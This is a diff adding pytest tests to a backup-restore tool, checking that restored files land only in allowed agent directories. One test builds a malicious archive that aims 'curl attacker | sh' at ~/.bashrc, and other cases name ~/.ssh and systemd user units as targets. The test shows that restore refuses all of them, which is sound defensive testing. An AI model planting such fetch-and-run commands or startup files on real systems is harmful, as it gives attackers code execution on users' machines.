@@ -7,6 +7,7 @@ byte the customer cares about is back.
 
 from __future__ import annotations
 
+import io
 import json
 import sqlite3
 import tarfile
@@ -15,7 +16,7 @@ from unittest.mock import patch
 
 import pytest
 
-from clawkeep import agent, hermes, restore
+from clawkeep import agent, hermes, openclaw, restore
 from clawkeep.api import Credentials
 from clawkeep.config import Config, HeartbeatConfig, OpenclawConfig
 
@@ -135,6 +136,198 @@ def test_create_archive_routes_to_the_hermes_backend(
     out = agent.create_archive(_cfg(), output_dir=tmp_path / "out")
     assert out.archive_root.endswith("-hermes-backup")
     assert hermes.read_manifest(out.path)["agent"] == "hermes"
+
+
+# ── where a restore may land ─────────────────────────────────────────────────
+
+def _hermes_box(edition_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
+    edition_file.write_text("CLAWBOX_EDITION=hermes\n", encoding="utf-8")
+    home = tmp_path / "home"
+    monkeypatch.setenv("HOME", str(home))
+    monkeypatch.setenv("HERMES_HOME", str(home / ".hermes"))
+    monkeypatch.setenv("CLAWBOX_HOME", str(home / ".clawbox"))
+    return home
+
+
+def test_restore_roots_follow_the_env_on_each_edition(
+    edition_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Hermes: exactly the ASSETS allowlist under HERMES_HOME / CLAWBOX_HOME —
+    the same resolution `create_archive` used, so a round trip on a box with
+    the env set still matches. OpenClaw: whatever the CLI's dry-run declares,
+    resolved by the CLI under the environment it was spawned with."""
+    home = _hermes_box(edition_file, tmp_path, monkeypatch)
+    roots = agent.restore_roots(_cfg())
+    assert roots.agent == "hermes"
+    assert {r.path for r in roots.roots} == {str(hermes.source_path(a)) for a in hermes.ASSETS}
+    assert str(home / ".hermes" / "config.yaml") in {r.path for r in roots.roots}
+    by_kind = {r.kind: r for r in roots.roots}
+    assert by_kind["sessions"].entry == "file" and by_kind["sessions"].sqlite
+    assert by_kind["memories"].entry == "dir" and not by_kind["memories"].sqlite
+    assert by_kind["identity"].path == str(home / ".clawbox" / "agent-identity")
+
+    edition_file.write_text("CLAWBOX_EDITION=openclaw\n", encoding="utf-8")
+    state = tmp_path / "elsewhere" / ".openclaw"
+    with patch(
+        "clawkeep.openclaw.plan_roots",
+        return_value=(
+            openclaw.PlannedRoot("state", str(state)),
+            openclaw.PlannedRoot("agent", str(state / "agents" / "main" / "agent")),
+        ),
+    ) as plan:
+        roots = agent.restore_roots(_cfg())
+    plan.assert_called_once_with("openclaw")
+    assert roots.agent == "openclaw"
+    assert {r.path for r in roots.roots} == {str(state), str(state / "agents" / "main" / "agent")}
+    assert all(r.entry == "dir" and not r.sqlite for r in roots.roots)
+
+
+def test_a_hermes_destination_is_pinned_to_its_kind(
+    edition_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    home = _hermes_box(edition_file, tmp_path, monkeypatch)
+    roots = agent.restore_roots(_cfg())
+    memories = str(home / ".hermes" / "memories")
+    config = str(home / ".hermes" / "config.yaml")
+
+    # The real thing passes, with the shape it was archived in, and the answer
+    # is the ROOT it landed on: the path restore may use, and the box's own
+    # sqlite flag for it.
+    landed = agent.assert_destination_allowed("memories", "dir", memories, roots=roots)
+    assert landed.path == memories and not landed.sqlite
+    landed = agent.assert_destination_allowed("config", "file", config, roots=roots)
+    assert landed.path == config and not landed.sqlite
+    db = str(home / ".hermes" / "state.db")
+    landed = agent.assert_destination_allowed("sessions", "file", db, roots=roots, sqlite=True)
+    assert landed.path == db and landed.sqlite
+    # A manifest that says nothing about sqlite is still landing on a sqlite
+    # database: the flag comes from THIS box, so restore retires the stale
+    # `-wal`/`-shm` pair either way (the round trip below proves the effect).
+    landed = agent.assert_destination_allowed("sessions", "file", db, roots=roots)
+    assert landed.path == db and landed.sqlite
+
+    # `entry: "file"` for a kind Hermes declares as a directory: a file swap
+    # over `memories/` would delete the directory.
+    with pytest.raises(agent.DestinationRefusedError, match="archives it as a 'dir'"):
+        agent.assert_destination_allowed("memories", "file", memories, roots=roots)
+    # sqlite on a plain file: restore would rename `config.yaml-wal` aside.
+    with pytest.raises(agent.DestinationRefusedError, match="not a sqlite database"):
+        agent.assert_destination_allowed("config", "file", config, roots=roots, sqlite=True)
+    # The right kind at the wrong place — the classic: `~/.bashrc` as the config.
+    with pytest.raises(agent.DestinationRefusedError) as excinfo:
+        agent.assert_destination_allowed("config", "file", str(home / ".bashrc"), roots=roots)
+    assert ".bashrc" in str(excinfo.value) and config in str(excinfo.value)
+    # A kind no Hermes backup contains.
+    with pytest.raises(agent.DestinationRefusedError, match="not something a Hermes backup contains"):
+        agent.assert_destination_allowed("ssh", "dir", str(home / ".ssh"), roots=roots)
+    # A user unit under the home: Linger=yes on the box, so it would run at boot.
+    with pytest.raises(agent.DestinationRefusedError):
+        agent.assert_destination_allowed(
+            "hooks", "dir", str(home / ".config" / "systemd" / "user"), roots=roots,
+        )
+
+
+def test_an_openclaw_destination_must_be_a_declared_root_or_nested_agent_state(
+    edition_file: Path, tmp_path: Path,
+) -> None:
+    state = tmp_path / ".openclaw"
+    roots = agent.RestoreRoots(agent="openclaw", roots=(
+        agent.RestoreRoot(str(state), "state", "dir", False, False),
+        agent.RestoreRoot(str(tmp_path / "openclaw.json"), "config", "file", False, False),
+    ))
+    assert agent.assert_destination_allowed(
+        "state", "dir", str(state), roots=roots,
+    ).path == str(state)
+    # The one file kind, pinned to `file`.
+    assert agent.assert_destination_allowed(
+        "config", "file", str(tmp_path / "openclaw.json"), roots=roots,
+    ).path == str(tmp_path / "openclaw.json")
+    # The CLI writes no `entry` key, so a `config` asset arrives as "dir" by
+    # default and is refused — as a limitation of this restore (put the file
+    # back by hand), never as the snapshot lying.
+    with pytest.raises(agent.DestinationRefusedError, match="has to be put back by hand") as excinfo:
+        agent.assert_destination_allowed("config", "dir", str(tmp_path / "openclaw.json"), roots=roots)
+    assert "manifest says" not in str(excinfo.value)
+    # A per-agent root or workspace INSIDE the state dir: the box may have
+    # dropped that agent from openclaw.json since the snapshot was taken.
+    assert agent.assert_destination_allowed(
+        "agent", "dir", str(state / "agents" / "old" / "agent"), roots=roots,
+    )
+    assert agent.assert_destination_allowed("workspace", "dir", str(state / "workspace"), roots=roots)
+    # But `state` — or anything else — inside a root is not a root.
+    with pytest.raises(agent.DestinationRefusedError, match="not a place this box's OpenClaw keeps state"):
+        agent.assert_destination_allowed("state", "dir", str(state / "credentials"), roots=roots)
+    # And nested does not mean "anywhere": the checkout is not under a root.
+    with pytest.raises(agent.DestinationRefusedError) as excinfo:
+        agent.assert_destination_allowed("workspace", "dir", "/home/clawbox/clawbox", roots=roots)
+    assert "/home/clawbox/clawbox" in str(excinfo.value)
+    assert str(state) in str(excinfo.value)  # names what IS allowed, for the owner
+
+
+@pytest.mark.parametrize("target", ["install.sh", "~/.openclaw", "/home/x/../etc", "/home/x/", "//home/x"])
+def test_every_destination_must_be_absolute_and_normalised(edition_file: Path, target: str) -> None:
+    roots = agent.RestoreRoots(agent="openclaw", roots=(
+        agent.RestoreRoot("/home/x", "state", "dir", False, False),
+    ))
+    with pytest.raises(agent.DestinationRefusedError, match="absolute, normalised") as excinfo:
+        agent.assert_destination_allowed("state", "dir", target, roots=roots)
+    assert target in str(excinfo.value)
+
+
+def test_restore_refuses_a_hermes_manifest_that_moves_an_asset_before_anything_moves(
+    edition_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """The finding on the Hermes edition: `entry: "file"` at `~/.bashrc`, in
+    a manifest that says `agent: hermes` and verifies clean (hermes.verify
+    only checks that every archivePath has bytes). Refused by name, and the
+    good assets ahead of it in the list are never moved."""
+    home = _hermes_box(edition_file, tmp_path, monkeypatch)
+    _seed(home)
+    (home / ".bashrc").write_text("export PS1=owner\n", encoding="utf-8")
+    live_config = (home / ".hermes" / "config.yaml").read_text()
+
+    root = "snap-root"
+    payload = {
+        "config": (home / ".hermes" / "config.yaml", b"model: attacker\n"),
+        "hooks": (home / ".bashrc", b"curl attacker | sh\n"),
+    }
+    manifest = {
+        "schemaVersion": 1, "agent": "hermes", "archiveRoot": root,
+        "assets": [
+            {"kind": kind, "sourcePath": str(target), "entry": "file",
+             "archivePath": f"{root}/payload/posix/{hermes._tar_name(target)}"}
+            for kind, (target, _) in payload.items()
+        ],
+    }
+    archive = tmp_path / "snap.tar.gz"
+    with tarfile.open(archive, "w:gz") as tf:
+        import io
+        blob = json.dumps(manifest).encode("utf-8")
+        info = tarfile.TarInfo(f"{root}/manifest.json")
+        info.size = len(blob)
+        tf.addfile(info, io.BytesIO(blob))
+        for target, content in payload.values():
+            info = tarfile.TarInfo(f"{root}/payload/posix/{hermes._tar_name(target)}")
+            info.size = len(content)
+            tf.addfile(info, io.BytesIO(content))
+    hermes.verify_archive(archive)  # the archive is, by the verifier's lights, fine
+
+    def fake_download(creds: Credentials, *, object_name: str, dest_path: Path) -> None:
+        dest_path.write_bytes(archive.read_bytes())
+
+    with (
+        patch("clawkeep.restore.api.mint_credentials", return_value=CREDS),
+        patch("clawkeep.restore.s3.download", side_effect=fake_download),
+    ):
+        with pytest.raises(restore.RestoreError, match=r"\.bashrc"):
+            restore.restore_snapshot(_cfg(), "claw_x", "snap-root.tar.gz")
+
+    assert (home / ".bashrc").read_text() == "export PS1=owner\n"
+    assert (home / ".hermes" / "config.yaml").read_text() == live_config
+    assert not list(home.glob(".bashrc.bak-restore-*"))
+    assert not list((home / ".hermes").glob("config.yaml.bak-restore-*"))
+    assert not list((home / ".hermes").glob(".clawkeep-restore-*"))
+    assert not list(home.glob(".clawkeep-restore-*"))
 
 
 # ── the round trip ───────────────────────────────────────────────────────────
@@ -340,6 +533,73 @@ def test_a_wal_database_restores_without_its_stale_sidecars(
     finally:
         conn.close()
     assert rows == {"remember this", "in the wal"}
+
+
+def test_a_sessions_asset_that_omits_the_sqlite_flag_still_retires_the_sidecars(
+    edition_file: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """The sidecar retirement is decided by THIS BOX, not by the manifest.
+
+    `_VettedAsset.sqlite` used to be `bool(asset.get("sqlite"))` — the
+    manifest's word — so a `sessions` asset with the key left out restored
+    `state.db` and left the old database's `-wal`/`-shm` beside it, for
+    sqlite to replay the stale writes into the fresh copy the next time
+    anything opened it. The flag now comes from the root the asset matched,
+    which for `sessions` is always the sqlite one; the manifest may only
+    agree (`sqlite: true` on a root that is not sqlite is still refused,
+    `test_a_hermes_destination_is_pinned_to_its_kind`).
+    """
+    edition_file.write_text("CLAWBOX_EDITION=hermes\n", encoding="utf-8")
+    home = tmp_path / "home"
+    monkeypatch.setenv("HOME", str(home))
+    monkeypatch.setenv("HERMES_HOME", str(home / ".hermes"))
+    monkeypatch.setenv("CLAWBOX_HOME", str(home / ".clawbox"))
+    _seed(home)
+    db = home / ".hermes" / "state.db"
+
+    made = agent.create_archive(_cfg(), output_dir=tmp_path / "out")
+
+    # Rewrite the manifest with the `sqlite` key dropped from the sessions
+    # asset — what a hand-edited or pre-flag manifest looks like. The member
+    # keeps its name, so the verify still finds the payload it declares.
+    stripped = tmp_path / "out" / made.path.name
+    unstripped = tmp_path / "unstripped.tar.gz"
+    made.path.rename(unstripped)
+    with tarfile.open(unstripped, "r:gz") as src, tarfile.open(stripped, "w:gz") as dst:
+        for m in src:
+            if m.name.endswith("/manifest.json"):
+                manifest = json.loads(src.extractfile(m).read())
+                sessions = next(a for a in manifest["assets"] if a["kind"] == "sessions")
+                assert sessions.pop("sqlite") is True  # the archiver did write it
+                blob = json.dumps(manifest).encode()
+                m.size = len(blob)
+                dst.addfile(m, io.BytesIO(blob))
+            else:
+                dst.addfile(m, src.extractfile(m) if m.isfile() else None)
+
+    # The stale pair beside the live database — the state being defended
+    # against, fabricated so the test does not depend on sqlite's checkpoint.
+    db.with_name("state.db-wal").write_bytes(b"stale wal")
+    db.with_name("state.db-shm").write_bytes(b"stale shm")
+
+    def fake_download(creds: Credentials, *, object_name: str, dest_path: Path) -> None:
+        dest_path.write_bytes(stripped.read_bytes())
+
+    with (
+        patch("clawkeep.restore.api.mint_credentials", return_value=CREDS),
+        patch("clawkeep.restore.s3.download", side_effect=fake_download),
+    ):
+        restore.restore_snapshot(_cfg(), "claw_x", stripped.name)
+
+    # Retired, exactly as they are when the manifest says `sqlite: true`.
+    assert not db.with_name("state.db-wal").exists()
+    assert not db.with_name("state.db-shm").exists()
+    assert list(db.parent.glob("state.db-wal.bak-restore-*"))
+    conn = sqlite3.connect(db)
+    try:
+        assert conn.execute("SELECT body FROM turns").fetchall() == [("remember this",)]
+    finally:
+        conn.close()
 
 
 def test_the_shared_identity_symlinks_come_back(
